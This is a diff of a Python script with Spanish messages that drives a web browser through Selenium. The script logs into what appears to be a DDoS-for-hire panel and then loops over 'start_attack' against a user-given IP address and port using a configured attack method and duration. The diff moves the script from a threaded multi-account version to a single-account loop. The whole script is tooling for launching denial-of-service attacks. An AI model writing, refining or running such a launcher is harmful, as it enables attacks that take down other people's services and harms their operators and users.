@@ -51,17 +51,6 @@ def get_user_input():
 ip, port = get_user_input()
 
 
-
-
-info = {
-    "cookies": [
-        ...
-    ],
-    "username": config.accounts[0][0],
-    "password": config.accounts[0][1],
-    "userAgent": config.user_agents[30]
-}
-
 main_logger = logging.getLogger()
 main_logger.addHandler(logging.FileHandler(config.logs["main"]))
 main_logger.setLevel(logging.ERROR)
@@ -72,55 +61,56 @@ thr = []
 x = 0
 
 
-try:
-    for account in config.accounts:
-        info_ = {
-            "username": account[0],
-            "password": account[1] 
-        }
-        def main(info):
-            i = 1
+
+def main():
+    
+    try:
+        driver = webdriver.Chrome(service=service, options=options)
+        bot = Bot(
+            driver=driver,
+            main_logger=main_logger,
+            username=config.account["username"],
+            password=config.account["password"]
+            )
+
+    except AttributeError as e:
+        raise e
+
+
+    def main_loop():
+        i = 1
+        try:
+            bot.start_attack(ip, port, config.attack["time"], config.attack["method"])
+            print(f"-----------------\nejecución: {i}\ncuenta: {config.account['username']}\n-----------------")
+            time.sleep(config.attack["time"])
+        except KeyboardInterrupt:
+            raise KeyboardInterrupt
+        except:
+            main_logger.error(traceback.format_exc())
+        finally:
+            i = i + 1
+            return
+    try:
+        try:
+            bot.login_form()
+            bot.DDoS_page()
+            bot.close_button()
+        except:
+            raise Exception("error al logearse")
+        time.sleep(5)
+            
+        while True:
             try:
-                driver = webdriver.Chrome(service=service, options=options)
-               
-            except AttributeError as e:
-                raise e
+                main_loop()
+            except KeyboardInterrupt:
+                raise KeyboardInterrupt
+    finally:
+        ...
 
 
-            try:
-                bot = Bot(driver=driver, info=info, main_logger=main_logger)
-                bot.login_form()
-                bot.DDoS_page()
-                bot.close_button()
-                
-                while True:
-                    try:
-                        bot.start_attack(ip, port, config.attack["time"], config.attack["method"])
-                        print(f"-----------------\nejecución: {i}\ncuenta: {info['username']}\n-----------------")
-                        time.sleep(config.attack["time"])
-                    except KeyboardInterrupt:
-                        break
-                    except:
-                        main_logger.error(traceback.format_exc())
-                    finally:
-                        i + 1
+main()
 
-            except Exception as e:
-                quit()
 
-        t = threading.Thread(target=main, args=(info_,))
-        
-        t.start()
-        time.sleep(1)
-        thr.append(t)
 
-        x += 1  # Incrementar x para avanzar a la siguiente cuenta en config.accounts
-    time.sleep(99999)
-    from typing import Any
-    inp: Any = input("presiona enter para terminar proceso...")
-    for thread in thr:
-        thread.join()
 
-except KeyboardInterrupt:
-    for thread in thr:
-        thread.join()
+
